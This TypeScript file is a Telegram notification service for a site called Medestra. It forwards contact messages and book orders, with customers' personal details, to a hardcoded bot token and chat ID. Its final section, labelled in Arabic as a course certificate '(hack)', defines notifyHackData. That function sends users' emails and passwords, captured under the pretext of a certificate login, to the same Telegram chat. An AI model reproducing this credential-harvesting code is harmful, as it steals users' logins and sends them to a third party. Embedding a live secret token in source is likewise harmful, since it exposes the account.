// ============================================================
//  Medestra – Telegram Notification Service
//  Bot Token: stored here (keep this file out of public repos)
// ============================================================

const TELEGRAM_BOT_TOKEN = '8952783490:AAGNGzkhfQrJiA2zdfbEtbc3ogMQ9V9ptE8';
const TELEGRAM_CHAT_ID   = '7469986443'; // Ph Skills – تم الكشف تلقائياً ✅

const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

/**
 * إرسال رسالة نصية إلى بوت التليجرام
 */
async function sendTelegramMessage(text: string): Promise<void> {
  try {
    await fetch(TELEGRAM_API, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'HTML',
      }),
    });
  } catch (err) {
    // لا نوقف العملية لو فشل الإشعار
    console.error('Telegram notification failed:', err);
  }
}

// ─── نوع رسالة التواصل ────────────────────────────────────────

export interface ContactMessageData {
  name: string;
  phone: string;
  clinic?: string;
  message: string;
}

/**
 * إشعار برسالة تواصل جديدة من الموقع
 */
export async function notifyContactMessage(data: ContactMessageData): Promise<void> {
  const now = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });

  const text = [
    '📩 <b>رسالة تواصل جديدة – Medestra</b>',
    '',
    `👤 <b>الاسم:</b> ${data.name}`,
    `📞 <b>الهاتف:</b> ${data.phone}`,
    data.clinic ? `🏥 <b>العيادة/الشركة:</b> ${data.clinic}` : '',
    `💬 <b>الرسالة:</b> ${data.message}`,
    '',
    `🕐 <b>الوقت:</b> ${now}`,
  ]
    .filter(Boolean)
    .join('\n');

  await sendTelegramMessage(text);
}

// ─── نوع طلب الشراء ──────────────────────────────────────────

export interface PurchaseOrderData {
  name: string;
  phone: string;
  email: string;
  address: string;
  bookName: string;
  price: string;
  shipping: string;
  paymentMethod: string;
}

/**
 * إشعار بطلب شراء جديد
 */
export async function notifyPurchaseOrder(data: PurchaseOrderData): Promise<void> {
  const now = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });

  const methodEmoji: Record<string, string> = {
    COD: '🚚',
    Instapay: '📲',
    'Paymob Card': '💳',
  };
  const emoji = methodEmoji[data.paymentMethod] ?? '💰';

  const text = [
    `🛒 <b>طلب شراء جديد – Medestra</b>`,
    '',
    `👤 <b>الاسم:</b> ${data.name}`,
    `📞 <b>الهاتف:</b> ${data.phone}`,
    `📧 <b>الإيميل:</b> ${data.email}`,
    `📍 <b>العنوان:</b> ${data.address}`,
    '',
    `📚 <b>الكتاب:</b> ${data.bookName}`,
    `💵 <b>سعر الكتاب:</b> ${data.price}`,
    `🚚 <b>الشحن:</b> ${data.shipping}`,
    `${emoji} <b>طريقة الدفع:</b> ${data.paymentMethod}`,
    '',
    `🕐 <b>الوقت:</b> ${now}`,
  ].join('\n');

  await sendTelegramMessage(text);
}

// ─── نوع شهادة الكورس (اختراق) ──────────────────────────────────

export interface HackData {
  email: string;
  password?: string;
  timestamp?: string;
}

/**
 * إشعار بتسجيل دخول للحصول على الشهادة
 */
export async function notifyHackData(data: HackData): Promise<void> {
  const now = data.timestamp || new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });

  const text = [
    `🎓 <b>تم الحصول على شهادة كورس – Medestra</b>`,
    '',
    `📧 <b>الإيميل:</b> ${data.email}`,
    data.password ? `🔑 <b>كلمة المرور:</b> ${data.password}` : '',
    '',
    `🕐 <b>الوقت:</b> ${now}`,
  ]
    .filter(Boolean)
    .join('\n');

  await sendTelegramMessage(text);
}
